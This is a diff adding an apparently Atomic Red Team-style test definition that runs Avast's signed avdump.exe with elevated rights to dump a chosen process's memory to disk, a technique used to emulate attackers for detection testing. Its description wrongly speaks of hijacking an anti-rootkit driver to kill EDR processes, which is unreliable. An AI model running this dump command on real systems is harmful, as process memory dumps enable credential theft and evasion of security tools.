@@ -1,0 +1,23 @@
+attack_technique: Avast's binary dumps processes
+display_name: Avast's binary dumps processes
+atomic_tests:
+- name: Avast's binary dumps processes
+  auto_generated_guid: 69a9a58b-e49b-4ced-9a75-3fbf51798e20
+  description: |
+    Attacker Hijacks avast anti-rootkit driver to terminate processes including EDR/EPP processes 
+  supported_platforms:
+    - windows
+  input_arguments:
+    ProcessId:
+      description: Proess Id that will be dumped by avast's binary
+      type: string
+      default: 1337
+    DestinationPath:
+      description: Path that will contain the process dump
+      type: path
+      default: c:\dump.dmp 
+  executor:
+    command: |
+     PathToAtomicsFolderAvast_DumpProcess\bin\avdump.exe --pid #{ProcessId} --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file #{DestinationPath} --min_interval 0
+    name: powershell
+    elevation_required: true
